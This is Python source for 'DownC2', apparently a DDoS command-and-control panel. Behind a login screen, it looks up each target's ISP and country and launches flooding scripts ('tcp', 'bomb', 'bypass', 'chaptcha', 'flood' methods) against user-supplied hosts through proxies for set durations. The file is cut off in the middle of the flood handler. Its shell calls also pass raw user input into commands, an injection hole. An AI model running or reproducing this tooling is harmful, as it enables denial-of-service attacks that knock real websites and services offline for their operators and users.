# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
from colorama import Fore, Back
import os,sys,time as t,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Global variable for username
logged_in_user = None  # We'll store the username here after login
ongoing_attacks = []  # List to store ongoing attack details

def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    global logged_in_user  # Declare global variable to store logged-in username
    while True:
        os.system('clear')
        print(f'''\033[34m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣶⣦⣤⣰⡄⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢶⣶⣤⣿⣿⣿⣿⣿⣿⣶⣾⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣿⣿⣿⣿⡿⠃⠀⢻⣿⣿⡟⣿⣿⣿⣿⣿⣿⣟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠀⠀⠀⠀⠉⠛⣻⣿⣿⣿⡿⠁⠀⠀⠀⢻⣿⡇⠘⡏⢿⣿⣿⣿⣿⡷⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡄⠀⠀⠀⠠⠾⠛⣿⣿⢻⠧⠤⠒⠂⠀⠀⠹⣇⠐⠛⠺⡿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⢠⣾⣿⣿⠸⢀⣠⣤⣄⠀⡇⠀⠈⣶⣦⣤⡁⢹⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀ʟᴏɢɪɴ ᴛᴏ ᴅᴏᴡɴᴄ2⠀⠀⠀
⣀⣀⣠⠞⠙⣤⣀⣀⡔⠛⠛⢿⣿⣀⡘⠛⠉⠀⠘⠃⠀⠀⠓⠷⠿⣷⣸⣿⣿⣇⠈⠃⠀⠀⠀⠀⠀⠀𝙱𝚞𝚢 : 𝙲𝚘𝚍𝚎𝚂𝚢𝚗𝚝𝚊𝚡⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⣦⡞⠉⠀⠀⠀⠀⠀⢸⣿⡙⣿⠶⠚⠉⠉⠉⣉⣉⠙⠋⣓⡿⢹⣿⡿⠀⠀⠀⠀⡆⠀⠀  
⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠈⢿⣧⠸⣾⣿⣿⠿⠿⠿⠿⠿⢿⡿⢁⣿⠟⠁⠀⠀⠀⢀⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⠀⠀⠀⠀⠀⣀⣠⠤⡄⠙⠧⣙⢿⣖⠒⠒⠒⢀⣰⠞⡡⠊⠀⠀⠀⠐⠒⠲⢏⣀⠽⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⣾⣿⠏⠉⠁⠀⠀⠈⣳⣮⣭⣒⣋⣭⣴⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⣠⣏⣇⣀⡀⠀⠀⢠⣾⣿⡏⠙⢿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⠚⠻⢿⣶⡖⣷⡴⣿⠀⣠⣿⣿⡿⠁⠀⠀⠉⠉⢻⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⢁⡴⠒⠶⣿⣧⠿⣤⣿⣷⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠛⣿⣿⣿⣿⠒⠤⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⢿⡥⠒⠒⠢⢤⣿⣿⢛⣿⣿⣿⣿⣿⠓⠦⡀⠀⠀⡠⠔⠚⢻⣿⣿⣿⡆⠀⠀⠀⠀⠑⢄⠀⠀⠀ 
⠀⣿⢋⣠⠶⢲⣶⣶⣿⠁⣼⢸⣿⣿⣿⣿⠀⠀⠉⠀⡖⠀⠀⠀⠈⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⠛⣏⣠⣴⠚⠿⣿⣿⠊⢸⢸⣿⣿⣿⣿⠀⠀⢀⣾⢀⡀⠀⠀⣰⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠓⠤⣀⠀⠀⠀⠀⠀⠀
⠸⠀⢼⠁⣿⡴⠿⠏⠹⠻⢾⣎⣿⣿⣿⡏⠙⠢⠏⠘⠋⢧⠴⠊⠀⣿⣿⣿⣿⡄⡰⠢⢄⡀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀
⠀⣆⣀⣾⡏⠉⣩⣏⣿⡋⢋⣿⣿⣿⣿⡇⠀⠀⠀⣀⣀⠀⠀⠀⢰⣿⣿⣿⣿⣷⠃⠀⠀⠈⠲⢄⡀⠀⠀⠀⠀⠀⠙⢶⣄⠀
⠀⣇⠀⠀⢻⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣀⣤⠿⣷⠀⠀⠀⢸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠉⠒⢤⡀⠀⠀⠀⠀⠈⢧
⠀⢸⠀⠀⠈⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠛⠋⠁⢠⣶⠉⠁⠀⢼⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⢀⡞
⠀⠈⡀⠀⠀⠘⣿⣿⣿⠇⣿⣿⣿⣿⣿⣷⠂⠀⢀⣈⣏⡀⢠⣤⣺⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡎⠀⠀⠀⠈⠀
⠀⠀⠁⠀⠀⠀⠉⠉⠉⠀⠉⠉⠉⠉⠉⠉⠀⠀⠉⠉⠁⠈⠈⠀⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀
\033[31m
''')
        username = input("Username » ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            logged_in_user = username  # Store the username of the logged-in user
            print(f"""
Login berhasil! Welcome, {username} 🪐!""")
            t.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")
            t.sleep(1)

ip = requests.get('https://api.ipify.org').text.strip()

def methods():
    # Baca data dari file JSON
    with open('assets/methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"""                          Methods
 {'NAME'}     │ {'DESCRIPTION'}                   │ {'DURATION'} """)
    print('──────────┼───────────────────────────────┼──────────')
    for method in methods_data:
        print(f"{method['name']:<9} │ {method['description']:<29} │ {method['duration']:<3}")

# Fungsi untuk mendapatkan ISP, ASN, org, dan country berdasarkan IP menggunakan API ip-api.com
def get_ip_info(ip):
    try:
        # URL untuk mendapatkan data dari API ip-api.com
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        # Mengirim permintaan ke API ip-api.com untuk mendapatkan data IP
        response = requests.get(url)
        data = response.json()

        # Cek apakah status API berhasil atau gagal
        if data['status'] != 'success':
            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'  # Jika gagal, kembalikan 'Unknown'

        # Mengambil informasi ISP, ASN, org, dan country
        asn = data.get('as', 'Unknown ASN')  # ASN biasanya disediakan dalam format 'ASXXXX'
        isp = data.get('isp', 'Unknown ISP')
        org = data.get('org', 'Unknown Org')  # Organisasi yang memiliki IP ini
        country = data.get('country', 'Unknown Country')  # Negara yang terkait dengan IP

        return asn, isp, org, country
    except requests.RequestException as e:
        print(f"Error fetching ASN and ISP data: {e}")
        return 'ASN Unknown', 'ISP Unknown', 'Org Unknown', 'Country Unknown'  # Jika ada kesalahan dalam permintaan

# Fungsi untuk mengekstrak IP dari URL
def get_ip_from_url(url):
    try:
        # Menggunakan socket untuk mendapatkan IP dari URL (hostname)
        hostname = url.split("://")[-1].split("/")[0]  # Menangani http/https dan menghilangkan path
        ip = socket.gethostbyname(hostname)  # Mendapatkan IP dari hostname
        return ip
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for URL {url}")
        return None

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b/%d/%Y")

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

# Fungsi untuk memperbarui status serangan secara otomatis
def update_attacks():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    while True:
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Tunggu beberapa detik sebelum mengecek kembali
        t.sleep(1)  # Bisa disesuaikan sesuai kebutuhan

# Fungsi untuk menampilkan serangan yang sedang berlangsung
def ongoing():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    if ongoing_attacks:
        print(f"""                      Running
 {'#'} │       {'HOST'}      │ {'SINCE'} │ {'DURATION'} │ {'METHOD'} """)
        print('───┼─────────────────┼───────┼──────────┼────────')

        # Memperbarui status serangan yang sudah selesai dan menghapusnya
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)  # Menambahkan serangan yang selesai ke list 'completed_attacks'
            else:
                attack['status'] = 'Ongoing'

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Menampilkan serangan yang sedang berlangsung
        for i, attack in enumerate(ongoing_attacks, 1):
            elapsed_time = int(t.time() - attack['start_time'])
            print(f" {i} │ {attack['host']:>15} │  {elapsed_time:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

        # Menampilkan serangan yang sudah selesai, jika ada
        for i, attack in enumerate(completed_attacks, 1):
            print(f" {i} │ {attack['host']:>15} │  {attack['duration']:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

    else:
        print("(cnc) No running attacks, why not start some?")

def myinfo():
    print(f"""username={logged_in_user}
concurrents=3
timelimit=86000
cooldown=0
expiry=999.99 Millenium(s) left
Myip={ip}:48970
Myclient=SSH-2.0-OpenSSH_9.9""")

def credits():
    print("""============CREDITS============
Version: 9.1
Creator: CodeSyntax
Website: Coming Soon
==============END==============""")

def help():
    print("""                              Commands
 NAME     │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ display all registered commands
 methods  │ ----               │ display all registered methods
 clear    │ cls,c              │ see your amazing banner
 ongoing  │ ----               │ view running attacks
 exit     │ goodbye,imaheadout │ removes your session
 credits  │ whodoneit          │ credits
 myinfo   │ acccount,info      │ returns user info""")

def menu():
    os.system('clear')
    print(f"""
\033[36m        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀
\033[36m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀
\033[36m⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀
\033[36m⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀    
\033[36m⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄
\033[36m⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄     \033[1;32mOWNER: \033[36m@FLAYINGSORYOU\033[0m
\033[36m⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆    \033[1;32mUSERNAME: \033[36m{logged_in_user}\033[0m
\033[36m⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆   \033[1;32mEXPIRY: \033[36m9999.99 Millennium(s)\033[0m
\033[36m⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄   \033[1;32mTIMELIMIT: \033[36m86000\033[0m
\033[36m⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷   \033[1;32mVIP: \033[36mtrue\033[0m
\033[36m⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹   \033[1;32mCOOLDOWN: \033[36m0\033[0m
\033[36m⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
\033[36m⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
\033[36m⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀
\033[36m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠
\033[36m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂
""")
    print("                \033[36mＷｅｌｃｏｍｅ Ｔｏ ＤｏｗｎＣ２")
    print("""             \033[36m> Ｔｙｐｅ "ｈｅｌｐ" ｔｏ ｓｔａｒｔ <
""")

def main():
    global ongoing_attacks
    threading.Thread(target=update_attacks, daemon=True).start()
    while True:
        sys.stdout.write(f"\x1b]2;0 boats | Succubus Custom Build | Serving {logged_in_user} | Active Sessions 2 | 9999.99 Millenium(s)\x07")
        sin = input(f"\033[48;5;15m\033[1;31m{logged_in_user}\033[0m ★ \033[48;5;15m\033[1;31mDownC2\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
        sinput = sin.split(" ")[0]
        if sinput == "cls" or sinput == "c":
            os.system('clear')
            menu()
        if sinput == "stop":
            ongoing_attacks = []  # Reset ongoing attacks when stop is typed
            os.system ("pkill screen")  
            menu()            
        if sinput == "help":
            help()
        if sinput == "myinfo" or sinput == "account" or sinput == "info":
            myinfo()
        if sinput == "methods":
            methods()
        if sinput == "ongoing":
            ongoing()
        if sinput == "credits" or sinput == "whodoneit":
            credits()
        if sinput == "exit" or sinput == "goodbye" or sinput == "imaheadout":
            print("Goodbye !")
            break
        elif sinput == "":
            main()

#########LAYER-4 - 7########
        elif sinput == "tcp" or sinput == "TCP":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])
                
                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tcp',
                        'status': 'Ongoing'
                    })
                    os.system('clear')  
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node tcp.js {ip} {port} {duration}')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "bomb" or sinput == "BOMB":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'bomb',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data GET')
                    os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data POST')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "bypass" or sinput == "BYPASS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'bypass',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node bypassv2.js {url} {duration} 64 2 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "chaptcha" or sinput == "CHAPTCHA":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'chaptcha',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node chaptcha2.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "flood" or sinput == "FLOOD":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'flood',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node SkycatXFlood.js {url} {duration} 64 3 proxy.txt')
                    
